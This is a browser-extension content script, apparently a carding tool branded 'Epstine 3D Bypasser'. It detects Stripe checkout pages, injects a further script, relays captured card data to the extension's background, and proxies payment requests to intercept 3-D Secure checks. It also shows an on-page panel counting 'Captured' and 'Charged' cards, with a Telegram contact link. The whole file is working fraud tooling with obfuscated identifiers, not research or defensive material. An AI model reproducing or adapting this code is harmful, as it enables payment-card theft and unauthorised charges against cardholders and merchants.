(function() {
    if (!chrome.runtime?.sendMessage) {
        return;
    }
    document.documentElement.dataset.epstine3dBypasser = "on";
    window.addEventListener("message", async function(v_bq) {
        if (v_bq.source !== window) {
            return;
        }
        if (v_bq.data?.type === "X9K2M") {
            try {
                await chrome.runtime.sendMessage({
                    type: "Z4R8N",
                    card: v_bq.data.card
                });
                v_bi();
                v_az("capture", "Card captured");
            } catch (v_ah) {}
            return;
        }
        if (v_bq.data?.type === "Q7P3V") {
            try {
                await chrome.runtime.sendMessage({
                    type: "W5T1L",
                    card: v_bq.data.card
                });
                v_t("CHARGED", "#f87171");
                v_az("success", "Charge success");
            } catch (v_ak) {}
            return;
        }
        if (v_bq.data?.type === "EAGLE_FLY") {
            try {
                v_t("BYPASSING", "#fca5a5");
                v_az("bypass", "3DS intercepted");
                var v_bu = await chrome.runtime.sendMessage({
                    type: "H8J6Y",
                    url: v_bq.data.url,
                    method: v_bq.data.method,
                    headers: v_bq.data.headers,
                    body: v_bq.data.body,
                    site: v_bq.data.site || window.location.hostname
                });
                window.postMessage({
                    type: "EAGLE_LAND",
                    requestId: v_bq.data.requestId,
                    response: v_bu
                }, "*");
            } catch (v_au) {
                v_az("error", "Proxy failed");
                window.postMessage({
                    type: "EAGLE_LAND",
                    requestId: v_bq.data.requestId,
                    error: v_au.message
                }, "*");
            }
        }
    });
    var v_bk = document.createElement("script");
    v_bk.src = chrome.runtime.getURL("inject.js");
    v_bk.onload = function() {
        this.remove();
    };
    (document.head || document.documentElement).insertBefore(v_bk, (document.head || document.documentElement).firstChild);
    if (window.top !== window) {
        return;
    }
    var v_m = false;
    var v_bn = 0;
    var v_d = 0;

    function v_b() {
        var v_e = window.location.hostname;
        var v_k = window.location.pathname;
        var v_ae = window.location.href.toLowerCase();
        if (v_e === "checkout.stripe.com") {
            return true;
        }
        if (v_e.endsWith(".stripe.com") && v_k.startsWith("/pay/")) {
            return true;
        }
        var v_bl = /\/(checkout|pay|payment|billing|subscribe|purchase|order|cart)/i.test(v_k);
        var v_r = document.querySelector(".__PrivateStripeElement,.StripeElement");
        if (v_r) {
            var v_br = v_r.getBoundingClientRect();
            if (v_br.width > 0 && v_br.height > 0) {
                return true;
            }
        }
        var v_bf = document.querySelector("iframe[name*=\"__privateStripeFrame\"],iframe[src*=\"js.stripe.com\"],iframe[title*=\"Secure payment\"]");
        if (v_bf) {
            var v_br = v_bf.getBoundingClientRect();
            if (v_br.width > 50 && v_br.height > 20) {
                if (v_bl) {
                    return true;
                }
                if (document.querySelector("#payment-form,#card-element,#payment-element,[data-stripe]")) {
                    return true;
                }
            }
        }
        if (v_bl) {
            if (document.querySelector("#payment-form,#card-element,#payment-element,input[autocomplete=\"cc-number\"]")) {
                return true;
            }
        }
        return false;
    }

    function v_aw() {
        if (v_m) {
            return;
        }
        if (v_b()) {
            v_m = true;
            v_ar();
        }
    }
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", v_aw);
    } else {
        v_aw();
    }
    var v_bo = new MutationObserver(function() {
        if (!v_m) {
            v_aw();
        }
    });
    if (document.documentElement) {
        v_bo.observe(document.documentElement, {
            childList: true,
            subtree: true
        });
    }
    setTimeout(v_aw, 2000);
    setTimeout(v_aw, 5000);
    var v_at = null;
    var v_aq = null;
    var v_av = null;
    var v_bm = null;
    var v_bb = null;
    var v_bs = null;
    var v_aj = null;
    var v_af = null;
    var v_q = false;
    var v_a = null;

    function v_be(v_h) {
        if (!v_h) {
            return;
        }
        v_h.classList.remove("bump");
        v_h.offsetWidth;
        v_h.classList.add("bump");
    }

    function v_bi() {
        v_bn++;
        if (v_av) {
            v_av.textContent = v_bn;
            v_be(v_av);
        }
        v_t("CAPTURED", "#fca5a5");
    }

    function v_t(v_bj, v_ba) {
        if (!v_at || !v_aq) {
            return;
        }
        if (v_a) {
            clearTimeout(v_a);
        }
        v_at.textContent = v_bj;
        v_at.style.color = v_ba;
        v_aq.style.background = v_ba;
        v_a = setTimeout(function() {
            v_at.textContent = "LIVE";
            v_at.style.color = "#fca5a5";
            v_aq.style.background = "#f87171";
            v_a = null;
        }, 3000);
    }

    function v_az(v_s, v_ag) {
        if (!v_aj) {
            return;
        }
        var v_ay = {
            capture: "#fca5a5",
            success: "#f87171",
            bypass: "#fca5a5",
            error: "#ef4444"
        };
        var v_g = new Date();
        var v_p = v_g.getHours().toString().padStart(2, "0") + ":" + v_g.getMinutes().toString().padStart(2, "0") + ":" + v_g.getSeconds().toString().padStart(2, "0");
        if (v_af) {
            v_af.remove();
            v_af = null;
        }
        var v_ax = document.createElement("div");
        v_ax.className = "event";
        var v_f = document.createElement("div");
        v_f.className = "event-left";
        var v_al = document.createElement("div");
        v_al.className = "event-dot";
        v_al.style.background = v_ay[v_s] || "#71717a";
        var v_w = document.createElement("span");
        v_w.className = "event-text";
        v_w.textContent = v_ag;
        v_f.appendChild(v_al);
        v_f.appendChild(v_w);
        var v_bh = document.createElement("span");
        v_bh.className = "event-time";
        v_bh.textContent = v_p;
        v_ax.appendChild(v_f);
        v_ax.appendChild(v_bh);
        v_aj.insertBefore(v_ax, v_aj.firstChild);
        while (v_aj.children.length > 5) {
            v_aj.removeChild(v_aj.lastChild);
        }
        if (v_s === "success") {
            v_d++;
            if (v_bm) {
                v_bm.textContent = v_d;
                v_be(v_bm);
            }
        }
    }

    function v_ar() {
        v_bo.disconnect();
        var v_u = document.createElement("div");
        v_u.id = "epstine-3d-bypasser-host";
        var v_j = v_u.attachShadow({
            mode: "closed"
        });
        var v_ai = document.createElement("style");
        v_ai.textContent = "\n      * { margin: 0; padding: 0; box-sizing: border-box; }\n\n      @keyframes fadeIn {\n        from { opacity: 0; transform: translateY(8px); }\n        to { opacity: 1; transform: translateY(0); }\n      }\n      @keyframes blink {\n        0%, 100% { opacity: 1; }\n        50% { opacity: 0.4; }\n      }\n      @keyframes pop {\n        0% { transform: scale(1); }\n        50% { transform: scale(1.08); }\n        100% { transform: scale(1); }\n      }\n\n      .panel {\n        position: fixed;\n        bottom: 16px;\n        right: 16px;\n        width: 300px;\n        background: #09090b;\n        border: 1px solid #27272a;\n        border-radius: 12px;\n        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Inter', system-ui, sans-serif;\n        color: #fafafa;\n        z-index: 2147483647;\n        animation: fadeIn 0.3s ease-out;\n        overflow: hidden;\n      }\n\n      .header {\n        display: flex;\n        align-items: center;\n        justify-content: space-between;\n        padding: 12px 14px;\n        border-bottom: 1px solid #27272a;\n        cursor: pointer;\n      }\n      .header:hover { background: #18181b; }\n\n      .brand {\n        display: flex;\n        align-items: center;\n        gap: 10px;\n      }\n\n      .logo {\n        width: 26px;\n        height: 26px;\n        border-radius: 6px;\n        overflow: hidden;\n      }\n      .logo img {\n        width: 100%;\n        height: 100%;\n        object-fit: cover;\n      }\n\n      .brand-name {\n        font-size: 12px;\n        font-weight: 600;\n        color: #fafafa;\n        letter-spacing: -0.01em;\n      }\n\n      .header-right {\n        display: flex;\n        align-items: center;\n        gap: 8px;\n      }\n\n      .status {\n        display: flex;\n        align-items: center;\n        gap: 5px;\n        padding: 4px 8px;\n        background: rgba(220, 38, 38, 0.1);\n        border-radius: 4px;\n      }\n      .status-dot {\n        width: 5px;\n        height: 5px;\n        border-radius: 50%;\n        background: #ef4444;\n        animation: blink 2s infinite;\n      }\n      .status-text {\n        font-size: 10px;\n        font-weight: 600;\n        color: #fca5a5;\n        text-transform: uppercase;\n        letter-spacing: 0.04em;\n      }\n\n      .chevron {\n        color: #71717a;\n        transition: transform 0.2s;\n      }\n      .chevron.expanded { transform: rotate(180deg); }\n      .chevron svg { display: block; }\n\n      .body {\n        padding: 12px 14px;\n      }\n      .body.collapsed { display: none; }\n\n      .metrics {\n        display: flex;\n        gap: 8px;\n        margin-bottom: 12px;\n      }\n\n      .metric {\n        flex: 1;\n        padding: 12px;\n        background: #18181b;\n        border-radius: 8px;\n        text-align: center;\n      }\n\n      .metric-value {\n        font-size: 20px;\n        font-weight: 600;\n        color: #fafafa;\n        line-height: 1;\n        margin-bottom: 4px;\n        font-variant-numeric: tabular-nums;\n      }\n      .metric-value.on {\n        font-size: 11px;\n        font-weight: 700;\n        color: #fca5a5;\n        letter-spacing: 0.06em;\n      }\n      .metric-value.red { color: #f87171; }\n      .metric-value.bump { animation: pop 0.25s ease; }\n\n      .metric-label {\n        font-size: 9px;\n        font-weight: 500;\n        color: #71717a;\n        text-transform: uppercase;\n        letter-spacing: 0.04em;\n      }\n\n      .section-title {\n        font-size: 10px;\n        font-weight: 600;\n        color: #71717a;\n        text-transform: uppercase;\n        letter-spacing: 0.04em;\n        margin-bottom: 8px;\n        display: flex;\n        align-items: center;\n        justify-content: space-between;\n      }\n      .live-indicator {\n        display: flex;\n        align-items: center;\n        gap: 4px;\n      }\n      .live-dot {\n        width: 4px;\n        height: 4px;\n        background: #ef4444;\n        border-radius: 50%;\n        animation: blink 1.5s infinite;\n      }\n      .live-text {\n        font-size: 9px;\n        color: #a1a1aa;\n      }\n\n      .events {\n        display: flex;\n        flex-direction: column;\n        gap: 4px;\n        max-height: 100px;\n        overflow-y: auto;\n        margin-bottom: 12px;\n      }\n      .events::-webkit-scrollbar { width: 2px; }\n      .events::-webkit-scrollbar-thumb { background: #3f3f46; border-radius: 4px; }\n\n      .event {\n        display: flex;\n        align-items: center;\n        justify-content: space-between;\n        padding: 8px 10px;\n        background: #18181b;\n        border-radius: 6px;\n      }\n\n      .event-left {\n        display: flex;\n        align-items: center;\n        gap: 6px;\n      }\n      .event-dot {\n        width: 5px;\n        height: 5px;\n        border-radius: 50%;\n      }\n      .event-text {\n        font-size: 11px;\n        font-weight: 500;\n        color: #e4e4e7;\n      }\n      .event-time {\n        font-size: 9px;\n        color: #71717a;\n        font-variant-numeric: tabular-nums;\n      }\n\n      .empty-state {\n        padding: 16px;\n        text-align: center;\n        font-size: 11px;\n        color: #52525b;\n        background: #18181b;\n        border-radius: 6px;\n        margin-bottom: 12px;\n      }\n\n      .footer {\n        display: flex;\n        gap: 6px;\n      }\n\n      .btn {\n        flex: 1;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n        gap: 6px;\n        padding: 8px;\n        background: #18181b;\n        border-radius: 6px;\n        text-decoration: none;\n        color: #a1a1aa;\n        font-size: 10px;\n        font-weight: 600;\n        transition: background 0.15s, color 0.15s;\n      }\n      .btn:hover {\n        background: #27272a;\n        color: #e4e4e7;\n      }\n      .btn svg {\n        width: 12px;\n        height: 12px;\n        fill: currentColor;\n      }\n\n      .version-badge {\n        padding: 8px 10px;\n        background: #18181b;\n        border-radius: 6px;\n        font-size: 9px;\n        font-weight: 600;\n        color: #52525b;\n        letter-spacing: 0.02em;\n      }\n\n      @media (max-width: 360px) {\n        .panel { left: 8px; right: 8px; width: auto; }\n      }\n\n      @media (prefers-reduced-motion: reduce) {\n        *, *::before, *::after { animation: none !important; transition: none !important; }\n      }\n    ";
        v_j.appendChild(v_ai);
        var v_bd = document.createElement("div");
        v_bd.className = "panel";
        var v_x = document.createElement("div");
        v_x.className = "header";
        var v_bv = document.createElement("div");
        v_bv.className = "brand";
        var v_bt = document.createElement("div");
        v_bt.className = "logo";
        var v_aa = document.createElement("img");
        v_aa.src = chrome.runtime.getURL("icon.png");
        v_aa.alt = "Epstine";
        v_bt.appendChild(v_aa);
        var v_am = document.createElement("div");
        v_am.className = "brand-name";
        v_am.textContent = "Epstine";
        v_bv.appendChild(v_bt);
        v_bv.appendChild(v_am);
        var v_bp = document.createElement("div");
        v_bp.className = "header-right";
        var v_bc = document.createElement("div");
        v_bc.className = "status";
        v_aq = document.createElement("div");
        v_aq.className = "status-dot";
        v_at = document.createElement("span");
        v_at.className = "status-text";
        v_at.textContent = "LIVE";
        v_bc.appendChild(v_aq);
        v_bc.appendChild(v_at);
        v_bs = document.createElement("div");
        v_bs.className = "chevron expanded";
        v_bs.innerHTML = "<svg width=\"14\" height=\"14\" viewBox=\"0 0 14 14\" fill=\"none\"><path d=\"M3.5 5.25L7 8.75L10.5 5.25\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg>";
        v_bp.appendChild(v_bc);
        v_bp.appendChild(v_bs);
        v_x.appendChild(v_bv);
        v_x.appendChild(v_bp);
        v_x.addEventListener("click", function() {
            v_q = !v_q;
            if (v_q) {
                v_bb.classList.add("collapsed");
                v_bs.classList.remove("expanded");
            } else {
                v_bb.classList.remove("collapsed");
                v_bs.classList.add("expanded");
            }
        });
        v_bb = document.createElement("div");
        v_bb.className = "body";
        var v_ac = document.createElement("div");
        v_ac.className = "metrics";
        var v_bg = document.createElement("div");
        v_bg.className = "metric";
        v_av = document.createElement("div");
        v_av.className = "metric-value";
        v_av.textContent = "0";
        var v_l = document.createElement("div");
        v_l.className = "metric-label";
        v_l.textContent = "Captured";
        v_bg.appendChild(v_av);
        v_bg.appendChild(v_l);
        var v_y = document.createElement("div");
        v_y.className = "metric";
        var v_n = document.createElement("div");
        v_n.className = "metric-value on";
        v_n.textContent = "ON";
        var v_ap = document.createElement("div");
        v_ap.className = "metric-label";
        v_ap.textContent = "Bypass";
        v_y.appendChild(v_n);
        v_y.appendChild(v_ap);
        var v_ab = document.createElement("div");
        v_ab.className = "metric";
        v_bm = document.createElement("div");
        v_bm.className = "metric-value red";
        v_bm.textContent = "0";
        var v_as = document.createElement("div");
        v_as.className = "metric-label";
        v_as.textContent = "Charged";
        v_ab.appendChild(v_bm);
        v_ab.appendChild(v_as);
        v_ac.appendChild(v_bg);
        v_ac.appendChild(v_y);
        v_ac.appendChild(v_ab);
        var v_ao = document.createElement("div");
        v_ao.className = "section-title";
        var v_v = document.createElement("span");
        v_v.textContent = "Events";
        var v_i = document.createElement("div");
        v_i.className = "live-indicator";
        var v_c = document.createElement("div");
        v_c.className = "live-dot";
        var v_o = document.createElement("span");
        v_o.className = "live-text";
        v_o.textContent = "Live";
        v_i.appendChild(v_c);
        v_i.appendChild(v_o);
        v_ao.appendChild(v_v);
        v_ao.appendChild(v_i);
        v_aj = document.createElement("div");
        v_aj.className = "events";
        v_af = document.createElement("div");
        v_af.className = "empty-state";
        v_af.textContent = "No events yet";
        v_aj.appendChild(v_af);
        var v_ad = document.createElement("div");
        v_ad.className = "footer";
        var v_an = document.createElement("a");
        v_an.className = "btn";
        v_an.href = "https://t.me/Samuraibyasser";
        v_an.target = "_blank";
        v_an.rel = "noopener noreferrer";
        v_an.innerHTML = "<svg viewBox=\"0 0 24 24\"><path d=\"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z\"/></svg><span>Telegram</span>";
        var v_z = document.createElement("div");
        v_z.className = "version-badge";
        v_z.textContent = "v1.0";
        v_ad.appendChild(v_an);
        v_ad.appendChild(v_z);
        v_bb.appendChild(v_ac);
        v_bb.appendChild(v_ao);
        v_bb.appendChild(v_aj);
        v_bb.appendChild(v_ad);
        v_bd.appendChild(v_x);
        v_bd.appendChild(v_bb);
        v_j.appendChild(v_bd);
        document.documentElement.appendChild(v_u);
    }
})();